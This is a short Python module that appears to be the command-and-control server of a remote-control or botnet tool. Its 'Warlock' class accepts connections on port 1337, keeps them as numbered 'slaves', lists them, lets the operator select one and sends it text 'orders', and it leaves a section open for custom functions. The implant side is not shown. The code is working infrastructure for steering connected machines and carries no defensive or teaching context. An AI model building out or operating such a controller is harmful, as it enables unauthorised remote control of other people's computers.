#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import threading
from . import settings


class Connection:
    def __init__(self, cid, conn, addr):
        self.cid    = cid
        self.conn   = conn
        self.addr   = addr

class Warlock(threading.Thread):

    slaves       = {}
    sCount       = 0
    currentSid   = None

    def __init__(self):
        super().__init__()
        self.s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('localhost', 1337))
        self.s.listen(5)

    def run(self):

        while True:
            conn, addr = self.s.accept()
            self.sCount +=1
            self.slaves[self.sCount] = Connection(self.sCount, conn, addr)

    def showSlaves(self, _):
        print("ID   |   Address")
        print("--------------------------")
        for k, v in self.slaves.items():
            print("{0:0>3}  |   {1}:{2}".format(k, v.addr[0], v.addr[1]))

    def selectSlave(self, sid):
        self.currentSid = sid

    def back2all(self, _):
        self.currentSid = None

    # Send Order to a Slave
    def command(self, sid, order):
        # print(sid, type(sid))
        self.slaves[sid].conn.send(bytes(order, encoding='utf-8'))
        if order == 'quit':
            self.currentSid = None

    def printHelp(self, _):
        print(settings.HELP)

    ##################################################
    ### API: CUSTOM FUNCTIONS SHOULD BE WRITE HERE ###
    ##################################################
